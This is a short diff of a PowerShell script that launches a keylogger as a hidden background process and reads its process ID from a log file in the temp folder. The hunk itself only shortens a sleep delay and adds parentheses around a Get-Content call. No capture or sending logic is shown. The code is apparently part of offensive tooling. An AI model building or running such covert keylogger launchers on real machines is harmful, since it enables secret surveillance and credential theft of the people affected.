@@ -114,8 +114,8 @@ IF($Action -ieq "start")
       Start-Process -WindowStyle Hidden powershell -ArgumentList "$cmdlineToExec"
       If($?)
       {
-         Start-Sleep -Milliseconds 1850 #Give some time for log creation
-         $PPID = Get-Content "$Env:TMP\pid.log" | Where-Object { $_ -ne '' }
+         Start-Sleep -Milliseconds 1500 #Give some time for log creation
+         $PPID = (Get-Content "$Env:TMP\pid.log" | Where-Object { $_ -ne '' })
          write-host "`n * Keylogger process started with ID: $PPID" -ForegroundColor Green
       }
       Else
